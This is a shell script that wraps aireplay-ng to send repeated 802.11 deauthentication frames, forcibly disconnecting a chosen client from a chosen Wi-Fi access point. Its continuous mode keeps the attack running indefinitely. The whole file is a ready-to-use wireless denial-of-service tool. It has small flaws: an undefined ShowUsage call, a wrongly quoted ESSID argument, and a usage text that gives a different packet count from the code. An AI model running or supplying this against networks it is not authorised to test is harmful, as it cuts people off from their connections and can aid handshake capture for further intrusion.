#!/bin/sh

if [ $# -lt 2 ]; then
	echo "Usage: $0 --ap=<AP BSSID> --client=<Client Mac> [--interface=<interface>] [--continuous] [--essid=<essid>]"
	echo "This application will deauthenticate <Client Mac> from the "
	echo "AP at <AP BSSID>"
	echo " "
	echo "<AP BSSID>   can be discovered through wireless.display_aps.sh"
	echo "             in the top section."
	echo "<Client Mac> can be discovered through wireless.display_aps.sh"
	echo "             as the station identifier in the bottom section."
	echo "--continuous  Will send 5 deauth packets, sleep for 2 seconds,"
	echo "             then repeat until broken."
	echo "--essid        If AP's are not beaconing, provide the essid"
	echo "All BSSID/Macs are of the format 01:02:03:04:05:06"
	echo " "
	echo ""
	echo "WARNING: Make sure to set the card to the correct channel with iwconfig first!"
	echo "Also: *** This WILL NOT WORK from USB wireless cards.  You must be booted into a main OS and run it from there such as a kali live boot."
	echo ""
	exit 1
fi

MONINTERFACE=`wireless.showmonitorinterface.sh 2> /dev/null`

if [ ${#MONINTERFACE} -eq 0 ]; then
	echo "Unable to find monitor interface.  Please run wireless.monitormode.sh to configure."
	echo "DEBUG: $MONINTERFACE"
	exit 1
fi

# By default use the first monitoring mode interface....
MONINTERFACE=`echo "$MONINTERFACE" | head -1`

CONTINUOUS=0
ESSID=""
CLIENTMAC=""
APMAC=""

for i in $*
do
	case $i in
	--interface=*)
		MONINTERFACE=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--ap=*)
		APMAC=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--client=*)
		CLIENTMAC=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--essid=*)
		ESSID=`echo $i | sed 's/[-a-zA-Z0-9]*=//'`
	;;
	--continuous)
		CONTINUOUS=1
	;;
	*)
		ShowUsage
		exit 1
	;;
	esac
done

if [ ${#APMAC} -eq 0 ]; then
	echo "ERROR: Please provide an access point mac address."
	exit 1
fi

if [ ${#ESSID} -gt 0 ]; then
	ADDESSID=`echo "-e $ESSID"`
else
	ADDESSID=""
fi

NUMDEAUTHS=10

if [ $CONTINUOUS -eq 0 ]; then
	for i in $(seq 1 $NUMDEAUTHS)
	do
		if [ ${#ADDESSID} -gt 0 ]; then
			aireplay-ng --deauth 1 -D -a $APMAC -c $CLIENTMAC "$ADDESSID" $MONINTERFACE
		else
			aireplay-ng --deauth 1 -D -a $APMAC -c $CLIENTMAC $MONINTERFACE
		fi
		sleep 1s
	done
else
	while [ $CONTINUOUS -eq 1 ]; do
		if [ ${#ADDESSID} -gt 0 ]; then
			aireplay-ng --deauth $NUMDEAUTHS -D -a $APMAC -c $CLIENTMAC "$ADDESSID" $MONINTERFACE
		else
			aireplay-ng --deauth $NUMDEAUTHS -D -a $APMAC -c $CLIENTMAC $MONINTERFACE
		fi
		sleep 2
	done
fi

